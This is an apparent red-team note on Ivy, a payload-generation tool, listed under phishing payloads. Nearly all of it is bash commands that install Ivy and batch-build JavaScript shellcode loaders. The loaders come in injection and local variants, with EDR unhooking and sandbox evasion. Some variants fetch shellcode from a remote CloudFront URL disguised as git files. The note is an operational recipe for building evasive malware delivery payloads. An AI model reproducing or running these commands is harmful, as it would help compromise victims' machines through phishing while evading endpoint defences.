---
creation date: March 14th 2022
last modified date: March 14th 2022
aliases: []
tags: #🧰
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]]
Links: [[03 - Content/Phishing Payloads]]
Search Tag: #🧰  

# [[Ivy]]  
___

## Description:


## Installation
```bash 
go install github.com/optiv/Ivy@latest

#make sure you change the two lines below:
export SHELLCODE_DIR=/share/Working/shellcode
export PATH=$PATH:~/go/bin


ls $SHELLCODE_DIR/*.bin | xargs -I {} /bin/bash -c "echo {} | cut -f 1 -d '.' | rev | cut -f 1 -d / | rev" | xargs -I {} /bin/bash -c "echo {} | Ivy -stageless -Ix64 $SHELLCODE_DIR/{}.bin -Ix86 $SHELLCODE_DIR/{}-x86.bin -P Local -O $SHELLCODE_DIR/ivy-{}.js"

ls $SHELLCODE_DIR/*.bin | xargs -I {} /bin/bash -c "echo {} | cut -f 1 -d '.' | rev | cut -f 1 -d / | rev" | xargs -I {} /bin/bash -c "echo {} | Ivy -stageless -Ix64 $SHELLCODE_DIR/{}.bin -Ix86 $SHELLCODE_DIR/{}-x86.bin -unhook -P Local -O $SHELLCODE_DIR/ivy-{}.js"
```

## Commands

To build all Ivy payloads  (change shellcode name to https-x64 and https-x86) (comment out dns payloads if you don't need them)

```bash
#/bin/bash

# Remote url's hosting shellcode
X64_REMOTE_URL=https://d3akgeeikhktpf.cloudfront.net/.git/.gitconfig
X86_REMOTE_URL=https://d3akgeeikhktpf.cloudfront.net/.git/HEAD

# Modify this to be the payload count you wish to start on (for naming purposes)
# i=3 would name payloads starting with 03-ivy-etc.js, 04-ivy-etc2.js, etc...
i=3

# Injection
PAYY=dns-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Inject -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject-$PAYY.js ; $((i++));
PAYY=dns-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Inject -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject-$PAYY.js ; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Inject -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Inject -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject-$PAYY.js ; $((i++));

# Injection Unhooked
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -P Inject -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject_unhook-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -P Inject -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject_unhook-$PAYY.js ; $((i++));

# Injection Unhooked Sandbox
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -P Inject -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject_unhook_sandbox-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -P Inject -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject_unhook_sandbox-$PAYY.js ; $((i++));

# Injection Unhooked Sandbox Remote
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -url $X64_REMOTE_URL -P Inject -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject_unhook_sandbox_url-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -url $X86_REMOTE_URL -P Inject -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-inject_unhook_sandbox_url-$PAYY.js ; $((i++));

# Local
PAYY=dns-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Local -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local-$PAYY.js; $((i++));
PAYY=dns-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Local -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local-$PAYY.js; $((i++));
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Local -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local-$PAYY.js; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -P Local -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local-$PAYY.js; $((i++));

# Local Unhooked
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -P Local -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local_unhook-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -P Local -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local_unhook-$PAYY.js ; $((i++));

# Local Unhooked Sandbox
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -P Local -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local_unhook_sandbox-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -P Local -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local_unhook_sandbox-$PAYY.js ; $((i++));

# Local Unhooked Sandbox Remote
PAYY=https-x64;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -url $X64_REMOTE_URL -P Local -Ix64 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local_unhook_sandbox_url-$PAYY.js ; $((i++));
PAYY=https-x86;PAY_NUM=$(printf "%02d\n" $i); Ivy -stageless -unhook -sandbox -url $X86_REMOTE_URL -P Local -Ix86 /share/Working/shellcode/$PAYY.bin -O $PAY_NUM-ivy-local_unhook_sandbox_url-$PAYY.js ; $((i++));


```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: March 14th 2022 (02:26 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
